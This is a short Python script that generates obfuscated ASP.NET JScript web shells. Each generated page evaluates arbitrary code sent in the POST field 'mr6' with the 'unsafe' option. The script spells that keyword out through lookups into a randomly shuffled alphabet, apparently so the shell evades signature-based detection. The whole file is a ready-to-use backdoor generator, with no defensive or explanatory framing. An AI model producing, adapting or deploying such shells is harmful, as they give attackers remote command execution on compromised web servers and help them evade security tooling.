import random
func='unsafe'
def random_list():
    str1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    str_random=list(str1)
    random.shuffle(str_random)
    return ''.join(str_random)


def random_index():
    ids=[]
    tmp_list=[]
    str_random=random_list()
   # print(str_random)
    for i in range(len(func)):
        ids.append(str_random.lower().find(func[i]))
   # print(ids)
    for i in ids:
        tmp='a({})'.format(i)
        tmp_list.append(tmp)
       # print('+'.join(tmp_list))
    return str_random,'+'.join(tmp_list)
    
def shell_main():
    text='''
<%@ Page Language="Jscript" Debug=true%>
<%
var a='{0}';
var b=Request.Form("mr6");
var c={1};
eval(b,c);
%>
    '''
    str_random,payload=random_index()
    res=text.format(str_random,payload)
    print(res)
shell_main()
